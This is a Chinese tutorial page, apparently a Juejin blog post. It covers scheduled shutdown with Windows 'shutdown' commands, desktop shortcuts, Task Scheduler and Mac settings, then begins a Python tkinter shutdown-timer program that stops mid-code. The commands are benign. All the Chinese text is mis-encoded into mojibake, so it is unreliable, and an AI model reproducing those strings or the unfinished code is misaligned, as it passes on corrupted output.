                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»13åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ä¸ºç”µè„‘è®¾ç½®å®šæ—¶å…³æœºæœ‰å¤šç§æ–¹æ³•ï¼Œä»ç®€å•åˆ°é«˜çº§ï¼Œæ‚¨å¯ä»¥æ ¹æ®è‡ªå·±çš„éœ€æ±‚é€‰æ‹©ã€‚</p>
<h4 data-id="heading-0">æ–¹æ³•ä¸€ï¼šä½¿ç”¨ Windows è‡ªå¸¦çš„å‘½ä»¤ï¼ˆæœ€ç®€å•é€šç”¨ï¼‰</h4>
<p>è¿™æ˜¯æœ€ç»å…¸ã€æœ€çµæ´»çš„æ–¹æ³•ï¼Œé€‚ç”¨äºæ‰€æœ‰ Windows ç³»ç»Ÿã€‚</p>
<ol>
<li>
<p><strong>æ‰“å¼€â€œè¿è¡Œâ€å¯¹è¯æ¡†</strong>ï¼š</p>
<ul>
<li>æŒ‰é”®ç›˜ä¸Šçš„ <code>Win</code> + <code>R</code> é”®ã€‚</li>
<li>æˆ–è€…åœ¨å¼€å§‹èœå•æœç´¢â€œè¿è¡Œâ€ã€‚</li>
</ul>
</li>
<li>
<p><strong>è¾“å…¥å…³æœºå‘½ä»¤</strong>ï¼š</p>
<ul>
<li>åœ¨æ‰“å¼€çš„è¿è¡Œæ¡†ä¸­ï¼Œè¾“å…¥ä»¥ä¸‹å‘½ä»¤ï¼š
<pre><code class="hljs language-cmd" lang="cmd">shutdown -s -t ç§’æ•°
</code></pre>
<ul>
<li><strong><code>shutdown</code></strong>ï¼šå…³æœºå‘½ä»¤ã€‚</li>
<li><strong><code>-s</code></strong>ï¼šè¡¨ç¤ºå…³é—­è®¡ç®—æœºã€‚</li>
<li><strong><code>-t</code></strong>ï¼šåé¢è·Ÿå»¶è¿Ÿæ—¶é—´ã€‚</li>
<li><strong><code>ç§’æ•°</code></strong>ï¼šæŒ‡å®šå¤šå°‘ç§’åå…³æœºã€‚ä¾‹å¦‚ï¼š
<ul>
<li>1å°æ—¶åå…³æœºï¼š<code>shutdown -s -t 3600</code> ï¼ˆ1å°æ—¶ = 60åˆ†é’Ÿ Ã— 60ç§’ï¼‰</li>
<li>2å°æ—¶åå…³æœºï¼š<code>shutdown -s -t 7200</code></li>
<li>30åˆ†é’Ÿåå…³æœºï¼š<code>shutdown -s -t 1800</code></li>
<li>æ™šä¸Š11ç‚¹å…³æœºï¼ˆå‡è®¾ç°åœ¨æ™šä¸Š10ç‚¹ï¼‰ï¼š<code>shutdown -s -t 3600</code></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>æ‰§è¡Œå‘½ä»¤</strong>ï¼š</p>
<ul>
<li>ç‚¹å‡»â€œç¡®å®šâ€æˆ–æŒ‰å›è½¦é”®ã€‚</li>
<li>æˆåŠŸåä¼šå¼¹å‡ºä¸€ä¸ªå°çª—å£æç¤ºâ€œWindows å°†åœ¨ XX åˆ†é’Ÿåå…³é—­â€ã€‚</li>
</ul>
</li>
</ol>
<p><strong>å¦‚ä½•å–æ¶ˆå®šæ—¶å…³æœºï¼Ÿ</strong></p>
<ul>
<li>åŒæ ·æ‰“å¼€â€œè¿è¡Œâ€ (<code>Win + R</code>)ï¼Œè¾“å…¥ï¼š
<pre><code class="hljs language-cmd" lang="cmd">shutdown -a
</code></pre>
</li>
<li>æŒ‰å›è½¦ã€‚ç³»ç»Ÿä¼šæç¤ºâ€œè®¡åˆ’çš„å…³é—­å·²å–æ¶ˆâ€ã€‚</li>
</ul>
<hr/>
<h4 data-id="heading-1">æ–¹æ³•äºŒï¼šåˆ›å»ºå®šæ—¶å…³æœºçš„å¿«æ·æ–¹å¼ï¼ˆä¸€é”®å¯åŠ¨ï¼‰</h4>
<p>å¦‚æœæ‚¨éœ€è¦é¢‘ç¹ä½¿ç”¨æŸä¸ªå›ºå®šçš„æ—¶é—´ï¼ˆå¦‚ä¸‹è½½å¤§æ–‡ä»¶å¸¸ç”¨2å°æ—¶ï¼‰ï¼Œå¯ä»¥åˆ›å»ºä¸€ä¸ªæ¡Œé¢å¿«æ·æ–¹å¼ã€‚</p>
<ol>
<li>åœ¨æ¡Œé¢ç©ºç™½å¤„ç‚¹å‡»å³é”®ï¼Œé€‰æ‹© <strong>æ–°å»º -&gt; å¿«æ·æ–¹å¼</strong>ã€‚</li>
<li>åœ¨â€œè¯·è¾“å…¥å¯¹è±¡çš„ä½ç½®â€æ¡†ä¸­ï¼Œè¾“å…¥å‘½ä»¤ï¼Œä¾‹å¦‚ï¼š
shutdown -s -t 7200
ï¼ˆè¿™é‡Œä»¥2å°æ—¶/7200ç§’ä¸ºä¾‹ï¼‰</li>
<li>ç‚¹å‡» <strong>ä¸‹ä¸€æ­¥</strong>ï¼Œä¸ºè¿™ä¸ªå¿«æ·æ–¹å¼èµ·ä¸ªåå­—ï¼Œä¾‹å¦‚â€œ2å°æ—¶åå…³æœºâ€ã€‚</li>
<li>ç‚¹å‡» <strong>å®Œæˆ</strong>ã€‚</li>
</ol>
<p>ç°åœ¨ï¼Œåªéœ€åŒå‡»è¿™ä¸ªæ¡Œé¢å›¾æ ‡ï¼Œå°±ä¼šå¯åŠ¨2å°æ—¶åå…³æœºçš„å‘½ä»¤ã€‚</p>
<hr/>
<h4 data-id="heading-2">æ–¹æ³•ä¸‰ï¼šä½¿ç”¨ä»»åŠ¡è®¡åˆ’ç¨‹åºï¼ˆç²¾ç¡®åˆ°å…·ä½“æ—¥æœŸå’Œæ—¶é—´ï¼‰</h4>
<p>å¦‚æœä½ æƒ³è¦åƒè®¾ç½®é—¹é’Ÿä¸€æ ·ï¼Œè®©ç”µè„‘åœ¨<strong>æ¯å¤©æ™šä¸Š11ç‚¹</strong>æˆ–<strong>æ¯å‘¨äº”ä¸‹åˆ5ç‚¹</strong>è‡ªåŠ¨å…³æœºï¼Œè¿™æ˜¯æœ€ä¸“ä¸šçš„æ–¹æ³•ã€‚</p>
<ol>
<li>åœ¨å¼€å§‹èœå•æœç´¢å¹¶æ‰“å¼€ <strong>â€œä»»åŠ¡è®¡åˆ’ç¨‹åºâ€</strong>ã€‚</li>
<li>åœ¨å³ä¾§æ“ä½œæ ï¼Œç‚¹å‡» <strong>â€œåˆ›å»ºåŸºæœ¬ä»»åŠ¡â€</strong>ã€‚</li>
<li><strong>è®¾ç½®åç§°å’Œæè¿°</strong>ï¼šä¾‹å¦‚â€œæ¯æ—¥è‡ªåŠ¨å…³æœºâ€ï¼Œç‚¹å‡»ä¸‹ä¸€æ­¥ã€‚</li>
<li><strong>é€‰æ‹©è§¦å‘å™¨</strong>ï¼šé€‰æ‹©â€œæ¯å¤©â€ã€â€œæ¯å‘¨â€æˆ–â€œä¸€æ¬¡â€ï¼Œç‚¹å‡»ä¸‹ä¸€æ­¥ã€‚
<ul>
<li>å¦‚æœé€‰â€œæ¯å¤©â€ï¼Œè®¾ç½®å¼€å§‹æ—¥æœŸå’Œå…·ä½“æ—¶é—´ï¼ˆå¦‚23:00ï¼‰ã€‚</li>
</ul>
</li>
<li><strong>é€‰æ‹©æ“ä½œ</strong>ï¼šé€‰æ‹©â€œå¯åŠ¨ç¨‹åºâ€ï¼Œç‚¹å‡»ä¸‹ä¸€æ­¥ã€‚</li>
<li><strong>è®¾ç½®ç¨‹åºæˆ–è„šæœ¬</strong>ï¼š
<ul>
<li>åœ¨â€œç¨‹åºæˆ–è„šæœ¬â€æ¡†ä¸­è¾“å…¥ï¼š<code>shutdown</code></li>
<li>åœ¨â€œæ·»åŠ å‚æ•°â€æ¡†ä¸­è¾“å…¥ï¼š<code>-s -f</code> ï¼ˆ<code>-f</code> è¡¨ç¤ºå¼ºåˆ¶å…³é—­æ­£åœ¨è¿è¡Œçš„åº”ç”¨ç¨‹åºï¼‰</li>
<li><strong>æ³¨æ„</strong>ï¼šè¿™é‡Œä¸éœ€è¦ <code>-t</code> å‚æ•°ï¼Œå› ä¸ºè§¦å‘æ—¶é—´ç”±ä»»åŠ¡è®¡åˆ’æ§åˆ¶ã€‚</li>
</ul>
</li>
<li>ç‚¹å‡»ä¸‹ä¸€æ­¥ï¼Œç„¶åå®Œæˆã€‚</li>
</ol>
<p>è¿™æ ·ï¼Œç”µè„‘å°±ä¼šåœ¨ä½ è®¾å®šçš„å‘¨æœŸå’Œæ—¶é—´ç‚¹è‡ªåŠ¨å…³æœºã€‚</p>
<hr/>
<h4 data-id="heading-3">æ–¹æ³•å››ï¼šä½¿ç”¨ç¬¬ä¸‰æ–¹è½¯ä»¶ï¼ˆåŠŸèƒ½å…¨é¢ã€ç•Œé¢å‹å¥½ï¼‰</h4>
<p>å¦‚æœä½ è§‰å¾—å‘½ä»¤éš¾è®°ï¼Œæˆ–è€…æƒ³è¦æ›´ç›´è§‚çš„å›¾å½¢ç•Œé¢ï¼Œå¾ˆå¤šè½¯ä»¶å¯ä»¥å¸®ä½ ã€‚</p>
<ul>
<li><strong>æ¨èè½¯ä»¶</strong>ï¼š
<ul>
<li><strong>Shutdown Timer</strong>ï¼šå°å·§ã€å…è´¹ã€æ— å¹¿å‘Šã€‚</li>
<li><strong>Wise Auto Shutdown</strong>ï¼šåŠŸèƒ½ä¸°å¯Œï¼Œå¯ä»¥å®šæ—¶å…³æœºã€é‡å¯ã€ç¡çœ ã€æ³¨é”€ç­‰ã€‚</li>
<li><strong>Airytec Switch Off</strong>ï¼šåŒæ ·åŠŸèƒ½å¼ºå¤§ï¼Œæ”¯æŒè¿œç¨‹ç®¡ç†ã€‚</li>
</ul>
</li>
</ul>
<p><strong>ä½¿ç”¨æ–¹å¼</strong>ï¼š
ä¸‹è½½å®‰è£…åï¼Œè½¯ä»¶ç•Œé¢é€šå¸¸éå¸¸ç›´è§‚ï¼Œä½ å¯ä»¥ç›´æ¥åœ¨ä¸‹æ‹‰èœå•ä¸­é€‰æ‹©â€œå…³æœºâ€ï¼Œç„¶åé€‰æ‹©æ—¶é—´ï¼ˆå¦‚â€œåœ¨â€ã€â€œæ¯å¤© 22:30â€ç­‰ï¼‰ï¼Œæœ€åç‚¹å‡»â€œå¯åŠ¨â€æˆ–â€œåº”ç”¨â€å³å¯ã€‚</p>
<hr/>
<h4 data-id="heading-4">Mac ç”¨æˆ·è®¾ç½®å®šæ—¶å…³æœº</h4>
<ol>
<li>ç‚¹å‡»å±å¹•å·¦ä¸Šè§’çš„ <strong>è‹¹æœèœå•</strong>ï¼Œé€‰æ‹© <strong>â€œç³»ç»Ÿåå¥½è®¾ç½®â€</strong>ã€‚</li>
<li>è¿›å…¥ <strong>â€œèŠ‚èƒ½â€</strong> ï¼ˆæˆ–â€œç”µæ± â€ï¼‰è®¾ç½®ã€‚</li>
<li>ç‚¹å‡»å³ä¸‹è§’çš„ <strong>â€œå®šæ—¶â€¦â€</strong> æŒ‰é’®ã€‚</li>
<li>åœ¨å¼¹å‡ºçš„çª—å£ä¸­ï¼Œå‹¾é€‰ç¬¬äºŒä¸ªå¤é€‰æ¡†ã€‚</li>
<li>åœ¨ä¸‹æ‹‰èœå•ä¸­ï¼Œé€‰æ‹© <strong>â€œå…³é—­â€</strong>ï¼Œç„¶åè®¾ç½®ä½ å¸Œæœ›å…³æœºçš„<strong>æ—¥æœŸå’Œæ—¶é—´</strong>ã€‚</li>
<li>ç‚¹å‡» <strong>â€œå¥½â€</strong> ä¿å­˜è®¾ç½®ã€‚</li>
</ol>
<hr/>
<h2 data-id="heading-5">pythonä»£ç å®ç°ï¼š</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a063f0e643534b19b6c1cfa0df2c50ac~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUGllcm9QQw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444027&amp;x-signature=13a3Vx2v36p1BnKSU9v7Yq4g3c8%3D" alt="image.png" loading="lazy"/>
ä¸‹é¢æ˜¯ä¸€ä¸ªä½¿ç”¨ Python tkinter å®ç°å‰ä¸‰ç§å®šæ—¶å…³æœºæ–¹æ³•çš„å®Œæ•´ç¨‹åºï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> tkinter <span class="hljs-keyword">as</span> tk
<span class="hljs-keyword">from</span> tkinter <span class="hljs-keyword">import</span> ttk, messagebox
<span class="hljs-keyword">import</span> os
<span class="hljs-keyword">import</span> time
<span class="hljs-keyword">import</span> subprocess
<span class="hljs-keyword">import</span> threading
<span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime, timedelta

<span class="hljs-keyword">class</span> <span class="hljs-title class_">ShutdownTimerApp</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, root</span>):
        self.root = root
        self.root.title(<span class="hljs-string">"å®šæ—¶å…³æœºå·¥å…· v1.0"</span>)
        self.root.geometry(<span class="hljs-string">"600x500"</span>)
        
        <span class="hljs-comment"># è®¾ç½®æ ·å¼</span>
        self.setup_styles()
        
        <span class="hljs-comment"># åˆ›å»ºä¸»ç•Œé¢</span>
        self.create_widgets()
        
        <span class="hljs-comment"># å­˜å‚¨å®šæ—¶ä»»åŠ¡çº¿ç¨‹</span>
        self.shutdown_thread = <span class="hljs-literal">None</span>
        self.is_scheduled = <span class="hljs-literal">False</span>
        
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">setup_styles</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""è®¾ç½®ç•Œé¢æ ·å¼"""</span>
        style = ttk.Style()
        style.configure(<span class="hljs-string">'Title.TLabel'</span>, font=(<span class="hljs-string">'å¾®è½¯é›…é»‘'</span>, <span class="hljs-number">16</span>, <span class="hljs-string">'bold'</span>))
        style.configure(<span class="hljs-string">'Method.TLabelframe.Label'</span>, font=(<span class="hljs-string">'å¾®è½¯é›…é»‘'</span>, <span class="hljs-number">11</span>, <span class="hljs-string">'bold'</span>))
        style.configure(<span class="hljs-string">'Large.TButton'</span>, font=(<span class="hljs-string">'å¾®è½¯é›…é»‘'</span>, <span class="hljs-number">10</span>))
        
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">create_widgets</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""åˆ›å»ºç•Œé¢ç»„ä»¶"""</span>
        <span class="hljs-comment"># æ ‡é¢˜</span>
        title_label = ttk.Label(self.root, text=<span class="hljs-string">"å®šæ—¶å…³æœºå·¥å…·"</span>, style=<span class="hljs-string">'Title.TLabel'</span>)
        title_label.pack(pady=<span class="hljs-number">20</span>)
        
        <span class="hljs-comment"># åˆ›å»ºç¬”è®°æœ¬æ§ä»¶ï¼ˆé€‰é¡¹å¡ï¼‰</span>
        self.notebook = ttk.Notebook(self.root)
        self.notebook.pack(fill=<span class="hljs-string">'both'</span>, expand=<span class="hljs-literal">True</span>, padx=<span class="hljs-number">20</span>, pady=<span class="hljs-number">10</span>)
        
        <span class="hljs-comment"># æ–¹æ³•ä¸€ï¼šä½¿ç”¨å‘½ä»¤</span>
        self.create_method1_tab()
        
        <span class="hljs-comment"># æ–¹æ³•äºŒï¼šå¿«æ·æ–¹å¼</span>
        self.create_method2_tab()
        
        <span class="hljs-comment"># æ–¹æ³•ä¸‰ï¼šä»»åŠ¡è®¡åˆ’ï¼ˆç®€åŒ–ç‰ˆï¼‰</span>
        self.create_method3_tab()
        
        <span class="hljs-comment"># çŠ¶æ€æ </span>
        self.create_status_bar()
        
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">create_method1_tab</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""åˆ›å»ºæ–¹æ³•ä¸€é€‰é¡¹å¡ï¼šä½¿ç”¨å‘½ä»¤"""</span>
        frame = ttk.Frame(self.notebook)
        self.notebook.add(frame, text=<span class="hljs-string">"æ–¹æ³•ä¸€ï¼šå‘½ä»¤è¡Œè®¾ç½®"</span>)
        
        <span class="hljs-comment"># è¯´æ˜æ ‡ç­¾</span>
        desc = <span class="hljs-string">"é€šè¿‡Windows shutdownå‘½ä»¤è®¾ç½®å®šæ—¶å…³æœº\næ”¯æŒè®¾ç½®ä»»æ„ç§’æ•°åå…³æœº"</span>
        desc_label = ttk.Label(frame, text=desc, font=(<span class="hljs-string">'å¾®è½¯é›…é»‘'</span>, <span class="hljs-number">10</span>))
        desc_label.pack(pady=<span class="hljs-number">10</span>)
        
        <span class="hljs-comment"># æ—¶é—´è®¾ç½®åŒºåŸŸ</span>
        time_frame = ttk.LabelFrame(frame, text=<span class="hljs-string">"è®¾ç½®å…³æœºæ—¶é—´"</span>, style=<span class="hljs-string">'Method.TLabelframe'</span>)
        time_frame.pack(fill=<span class="hljs-string">'x'</span>, padx=<span class="hljs-number">20</span>, pady=<span class="hljs-number">10</span>)
        
        <span class="hljs-comment"># é¢„è®¾æ—¶é—´æŒ‰é’®</span>
        preset_frame = ttk.Frame(time_frame)
        preset_frame.pack(pady=<span class="hljs-number">10</span>)
        
        preset_times = [
            (<span class="hljs-string">"30åˆ†é’Ÿå"</span>, <span class="hljs-number">1800</span>),
            (<span class="hljs-string">"1å°æ—¶å"</span>, <span class="hljs-number">3600</span>),
            (<span class="hljs-string">"2å°æ—¶å"</span>, <span class="hljs-number">7200</span>),
            (<span class="hljs-string">"3å°æ—¶å"</span>, <span class="hljs-number">10800</span>),
            (<span class="hljs-string">"5åˆ†é’Ÿå"</span>, <span class="hljs-number">300</span>)
        ]
        
        <span class="hljs-keyword">for</span> text, seconds <span class="hljs-keyword">in</span> preset_times:
            btn = ttk.Button(preset_frame, text=text, 
                           command=<span class="hljs-keyword">lambda</span> s=seconds: self.set_custom_time(s))
            btn.pack(side=<span class="hljs-string">'left'</span>, padx=<span class="hljs-number">5</span>)
        
        <span class="hljs-comment"># è‡ªå®šä¹‰æ—¶é—´è¾“å…¥</span>
        custom_frame = ttk.Frame(time_frame)
        custom_frame.pack(pady=<span class="hljs-number">10</span>)
        
        ttk.Label(custom_frame, text=<span class="hljs-string">"è‡ªå®šä¹‰æ—¶é—´ï¼š"</span>).pack(side=<span class="hljs-string">'left'</span>)
        
        self.hour_var = tk.StringVar(value=<span class="hljs-string">"0"</span>)
        hour_spin = ttk.Spinbox(custom_frame, from_=<span class="hljs-number">0</span>, to=<span class="hljs-number">23</span>, width=<span class="hljs-number">5</span>, 
                               textvariable=self.hour_var)
        hour_spin.pack(side=<span class="hljs-string">'left'</span>, padx=<span class="hljs-number">5</span>)
        ttk.Label(custom_frame, text=<span class="hljs-string">"å°æ—¶"</span>).pack(side=<span class="hljs-string">'left'</span>)
        
        self.minute_var = tk.StringVar(value=<span class="hljs-string">"30"</span>)
        minute_spin = ttk.Spinbox(custom_frame, from_=<span class="hljs-number">0</span>, to=<span class="hljs-number">59</span>, width=<span class="hljs-number">5</span>,
                                 textvariable=self.minute_var)
        minute_spin.pack(side=<span class="hljs-string">'left'</span>, padx=<span class="hljs-number">5</span>)
        ttk.Label(custom_frame, text=<span class="hljs-string">"åˆ†é’Ÿ"</span>).pack(side=<span class="hljs-string">'left'</span>)
        
        <span class="hljs-comment"># å‘½ä»¤é¢„è§ˆåŒºåŸŸ</span>
        preview_frame = ttk.LabelFrame(frame, text=<span class="hljs-string">"å‘½ä»¤é¢„è§ˆ"</span>, style=<span class="hljs-string">'Method.TLabelframe'</span>)
        preview_frame.pack(fill=<span class="hljs-string">'x'</span>, padx=<span class="hljs-number">20</span>, pady=<span class="hljs-number">10</span>)
        
        self.command_var = tk.StringVar()
        command_label = ttk.Label(preview_frame, textvariable=self.command_var, 
                                 font=(<span class="hljs-string">'Consolas'</span>, <span class="hljs-number">10</span>))
        command_label.pack(pady=<span class="hljs-number">10</span>)
        
        <span class="hljs-comment"># æŒ‰é’®åŒºåŸŸ</span>
        button_frame = ttk.Frame(frame)
        button_frame.pack(pady=<span class="hljs-number">20</span>)
        
        self.set_btn1 = ttk.Button(button_frame, text=<span class="hljs-string">"è®¾ç½®å®šæ—¶å…³æœº"</span>, 
                                  command=self.set_shutdown_cmd, style=<span class="hljs-string">'Large.TButton'</span>)
        self.set_btn1.pack(side=<span class="hljs-string">'left'</span>, padx=<span class="hljs-number">10</span>)
        
        self.cancel_btn1 = ttk.Button(button_frame, text=<span class="hljs-string">"å–æ¶ˆå®šæ—¶å…³æœº"</span>, 
                                     command=self.cancel_shutdown_cmd, style=<span class="hljs-string">'Large.TButton'</span>)
        self.cancel_btn1.pack(side=<span class="hljs-string">'left'</span>, padx=<span class="hljs-number">10</span>)
        
        <span class="hljs-comment"># æ›´æ–°å‘½ä»¤é¢„è§ˆ</span>
        self.update_command_preview()
        
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">create_method2_tab</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""åˆ›å»ºæ–¹æ³•äºŒé€‰é¡¹å¡ï¼šå¿«æ·æ–¹å¼"""</span>
        frame = ttk.Frame(self.notebook)
        self.notebook.add(frame, text=<span class="hljs-string">"æ–¹æ³•äºŒï¼šåˆ›å»ºå¿«æ·æ–¹å¼"</span>)
        
        <span class="hljs-comment"># è¯´æ˜æ ‡ç­¾</span>
        desc = <span class="hljs-string">"ä¸ºå¸¸ç”¨å…³æœºæ—¶é—´åˆ›å»ºæ¡Œé¢å¿«æ·æ–¹å¼\nåŒå‡»å³å¯å¯åŠ¨å®šæ—¶å…³æœº"</span>
        desc_label = ttk.Label(frame, text=desc, font=(<span class="hljs-string">'å¾®è½¯é›…é»‘'</span>, <span class="hljs-number">10</span>))
        desc_label.pack(pady=<span class="hljs-number">10</span>)
        
        <span class="hljs-comment"># å¿«æ·æ–¹å¼è®¾ç½®</span>
        shortcut_frame = ttk.LabelFrame(frame, text=<span class="hljs-string">"å¿«æ·æ–¹å¼è®¾ç½®"</span>, style=<span class="hljs-string">'Method.TLabelframe'</span>)
        shortcut_frame.pack(fill=<span class="hljs-string">'x'</span>, padx=<span class="hljs-number">20</span>, pady=<span class="hljs-number">10</span>)
        
        <span class="hljs-comment"># å¿«æ·æ–¹å¼åç§°</span>
        name_frame = ttk.Frame(shortcut_frame)
        name_frame.pack(pady=<span class="hljs-number">10</span>, anchor=<span class="hljs-string">'w'</span>, padx=<span class="hljs-number">20</span>)
        
        ttk.Label(name_frame, text=<span class="hljs-string">"å¿«æ·æ–¹å¼åç§°ï¼š"</span>).pack(side=<span class="hljs-string">'left'</span>)
        self.shortcut_name = tk.StringVar(value=<span class="hljs-string">"å®šæ—¶å…³æœº"</span>)
        name_entry = ttk.Entry(name_frame, textvariable=self.shortcut_name, width=<span class="hljs-number">30</span>)
        name_entry.pack(side=<span class="hljs-string">'left'</span>, padx=<span class="hljs-number">10</span>)
        
        <span class="hljs-comment"># å…³æœºæ—¶é—´è®¾ç½®</span>
        time_frame = ttk.Frame(shortcut_frame)
        time_frame.pack(pady=<span class="hljs-number">10</span>, anchor=<span class="hljs-string">'w'</span>, padx=<span class="hljs-number">20</span>)
        
        ttk.Label(time_frame, text=<span class="hljs-string">"å…³æœºæ—¶é—´ï¼š"</span>).pack(side=<span class="hljs-string">'left'</span>)
        
        self.shortcut_hours = tk.StringVar(value=<span class="hljs-string">"1"</span>)
        hour_spin = ttk.Spinbox(time_frame, from_=<span class="hljs-number">0</span>, to=<span class="hljs-number">23</span>, width=<span class="hljs-number">3</span>,
                               textvariable=self.shortcut_hours)
        hour_spin.pack(side=<span class="hljs-string">'left'</span>, padx=<span class="hljs-number">5</span>)
        ttk.Label(time_frame, text=<span class="hljs-string">"å°æ—¶"</span>).pack(side=<span class="hljs-string">'left'</span>)
        
        self.shortcut_minutes = tk.StringVar(value=<span class="hljs-string">"0"</span>)
        minute_spin = ttk.Spinbox(time_frame, from_=<span class="hljs-number">0</span>, to=<span class="hljs-number">59</span>, width=<span class="hljs-number">3</span>,
                                 textvariable=self.shortcut_minutes)
        minute_spin.pack(side=<span class="hljs-string">'left'</span>, padx=<span class="hljs-number">5</span>)
        ttk.Label(time_frame, text=<span class="hljs-string">"åˆ†é’Ÿ"</span>).pack(side=<span class="hljs-string">'left'</span>)
        
        <span class="hljs-comment"># å¿«æ·æ–¹å¼å†…å®¹é¢„è§ˆ</span>
        preview_frame = ttk.LabelFrame(frame, text=<span class="hljs-string">"å¿«æ·æ–¹å¼å†…å®¹"</span>, style=<span class="hljs-string">'Method.TLabelframe'</span>)
        preview_frame.pack(fill=<span class="hljs-string">'x'</span>, padx=<span class="hljs-number">20</span>, pady=<span class="hljs-number">10</span>)
        
        self.shortcut_content = tk.Text(preview_frame, height=<span class="hljs-number">4</span>, font=(<span class="hljs-string">'Consolas'</span>, <span class="hljs-number">9</span>))
        self.shortcut_content.pack(pady=<span class="hljs-number">10</span>, padx=<span class="hljs-number">10</span>, fill=<span class="hljs-string">'x'</span>)
        self.shortcut_content.insert(<span class="hljs-string">'1.0'</span>, <span class="hljs-string">"shutdown -s -t 3600"</span>)
